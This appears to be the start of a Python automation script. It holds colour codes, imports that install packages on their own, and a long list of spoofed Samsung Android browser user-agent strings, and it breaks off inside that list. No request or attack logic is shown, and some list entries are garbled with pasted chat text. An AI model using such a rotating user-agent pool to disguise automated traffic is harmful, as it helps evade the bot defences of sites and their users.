W = '\033[97;1m'

R = '\033[91;1m'

G = '\033[92;1m'

Y = '\033[93;1m'

B = '\033[94;1m'

P = '\033[95;1m'

C = '\033[96;1m'

N = '\x1b[0m'

import os

try:

	import requests

except ImportError:

	os.system("pip install requests")

 

try:

	import concurrent.futures

except ImportError:

	os.system("pip install futures")

 

import os

import sys

import time

import requests

import random

import platform

import base64

import subprocess

from concurrent.futures import ThreadPoolExecutor

import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess

try:

	import rich

except ImportError:

	os.system('pip install rich')

	time.sleep(1)

	try:

		import rich

	except ImportError:

		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

import base64

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from urllib.parse import quote

# UA LIST

#ugen2=open('frec.txt','r').read().splitlines()

#ugen=open('m.txt','r').read().splitlines()

ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']

ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; 